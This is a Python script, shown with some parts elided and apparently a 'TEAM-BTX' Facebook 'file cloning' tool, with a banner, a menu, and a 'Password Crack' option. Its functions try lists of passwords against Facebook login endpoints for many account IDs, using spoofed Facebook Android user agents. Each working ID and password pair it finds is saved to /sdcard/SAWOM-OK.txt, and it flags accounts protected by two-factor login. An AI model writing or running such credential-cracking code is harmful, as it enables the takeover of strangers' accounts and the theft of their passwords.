...
import smtplib
import math
import os,base64,pip,urllib
def clear():
        os.system('clear')
print('\033[1;37m[+] \033[1;32mWAIT UNTIL OPEN THE FILES...')
try:
...
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",]
...
\033[0;92m██████     ██    ██   ██ 
\033[0;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[0;92m 𝐁𝐓𝐗 𝐈𝐒 𝐊𝐈𝐍𝐆 — 𝐍𝐄𝐖 𝐖𝐎𝐑𝐋𝐃 — 𝐏𝐑𝐎 𝐌𝐀𝐗 𝐁𝐃 𝐈𝐍𝐃𝐈𝐀
\033[0;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m OWNER  \033[1;97m  ● \x1b[38;5;46mSAWON ISLAM\x1b[1;91m
\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;47m GITHUB  \033[1;97m ● \x1b[38;5;47mTEAM-BTX\x1b[1;91m
\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;49m STATUS  \033[1;97m ● \x1b[38;5;49mFREE-PAID
\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;50m TOOLS   \033[1;97m ● \033[1;97mFILE\x1b[38;5;46m┼\033[1;97mCLONE
\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;51m VERSION \033[1;97m ● \033[1;97mV\x1b[38;5;46m/\033[1;97m-1.0
...
def menu():
        try:
                ...
                if 1==1:
                        clear()
                        print('\033[1;37m[1️⃣] File cloning\n\033[1;37m[2️⃣] Close Tool')
                        linex()
                        xd=input('\033[1;37m[?] Choice : ')
                        if xd in ['1','01']:
                                os.system(' xdg-openhttps://www.facebook.com/profile.php?id=100084729666682&mibextid=ZbWKwL');clear()
                                ...
                                linex()
                                plist = []
                                print('\033[1;37m           Select Password Crack menu');linex();print('[1] Crack with auto password[Best Working]\n[2] Crack with choice password');linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [TEAM-BTX] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                print('\r\r\033[1;32m [SAWON-OK] %s | %s'%(ids,pas))
...
def api(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        ua = '[FBAN/FB4A;FBAV/"+str(random.randint(10, 99))+".0.0."+str(random.randint(1000, 9999))+";FBBV/"+str(random.randint(1000000, 9999999))+";[FBAN/FB4A;FBAV/153.0.0.53.88;FBBV/84425344;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/84425344;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G530FZ;FBSV/5.0.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [SAWON-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SAWOM-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[SAWON-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
